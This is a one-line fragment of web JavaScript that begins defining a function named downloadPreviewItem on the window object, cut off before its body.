 window.downloadPreviewItem = () => {
